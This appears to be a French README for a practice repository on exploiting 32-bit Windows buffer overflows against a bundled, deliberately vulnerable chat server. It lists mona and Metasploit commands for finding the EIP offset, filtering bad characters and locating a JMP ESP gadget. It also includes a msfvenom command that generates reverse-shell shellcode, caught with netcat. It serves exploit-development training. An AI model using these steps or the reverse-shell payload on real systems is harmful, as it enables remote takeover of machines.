# Exploitation-Buffer-Overflow-Windows-32-bits


Scripts de fuzzing et d'exploitation de buffer overflow 32 bits sous Windows


Les fichiers chatserver.exe et essfunc.dll sont incluent pour tester les scripts (Attention, l'application est vulnérable)


La liste des commandes est disponible dans le fichiers COMMANDS.txt



------------------------------------------------------------------------------------------



# Dans immunity on créer un nouveau workspace :
!mona config -set workingfolder c:\mona\%p

# On fuzz le binaire pour trouver l'offset qui créera le segfault avec le script fuzzing.py

# On créer un pattern avec metasploit pour trouver l'offset d'EIP
msf-pattern_create -l 2400

# On prend un template d'exploit et on ajoute notre pattern en tant que payload pour détecter le segfault

# On Retrouve l'offset exacte d'EIP au moment du crash
!mona findmsp -distance 2400

# On met à jour l'offset dans le script d'exploit et on recherche les badchars

# On créer un tableau de badchars avec mona
!mona bytearray -b "\x00"

# On génère une chaîne de badchars qu'on ajoute en tant que payload dans le script d'exploit

# On compare les badchars avec l'offset d'ESP au moment du crash
!mona compare -f C:\mona\<workingfolder>\bytearray.bin -a <ESP offset>

# On génére un shellcode avec metasploit excluant les badchars
msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -b "<badchars>" -f py

# On trouve un offset de jump sur ESP avec mona pour exécuter le shellcode
!mona jmp -r esp -cpb "<badchars>"

# On met à jour l'offset du retn dans le script d'exploit et on ajoute des NOPS (16 c'est pas mal)

# On démarre un netcat en local et on exploite :)

